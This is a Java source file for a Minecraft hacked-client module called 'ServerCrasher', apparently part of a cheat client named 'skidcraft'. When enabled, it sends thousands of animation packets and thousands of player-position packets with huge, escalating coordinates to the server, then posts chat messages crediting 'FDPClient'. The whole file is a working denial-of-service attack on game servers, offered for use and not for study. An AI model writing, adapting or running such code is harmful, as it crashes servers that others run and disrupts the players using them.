package wtf.kiddo.skidcraft.mod.impl.world;

import net.minecraft.src.*;
import wtf.kiddo.skidcraft.mod.Category;
import wtf.kiddo.skidcraft.mod.Mod;

/**
 * Author: zcy
 * Created: 2022/5/1
 */
public final class ServerCrasher extends Mod {
    public ServerCrasher() {
        super("ServerCrasher", Category.World);
//        this.setEnabled(true);
    }

/*    @EventListener
    public void onRender2DEvent(final Render2DEvent event) {

    }*/

    @Override
    protected void onEnable() {
        for(int i = 0; i <= 5000;i++){
            mc.thePlayer.sendQueue.addToSendQueue(new Packet18Animation(mc.thePlayer,102));
        }
        mc.thePlayer.addChatMessage("§8[§c§lFDP§6§lClient§8] §fStopSleep5000");
        float index = 0;
        while (index < 9999) {
            mc.thePlayer.sendQueue.addToSendQueue(new Packet11PlayerPosition(mc.thePlayer.posX + 9412 * index, mc.thePlayer.posY + 9412 * index,mc.thePlayer.posY + 9412 * index+0.3, mc.thePlayer.posZ + 9412 * index, true));
                    index++;
        }
        mc.thePlayer.addChatMessage("§8[§c§lFDP§6§lClient§8] §toxic position");
        this.toggle();
    }

    @Override
    protected void onDisable() {

    }
}
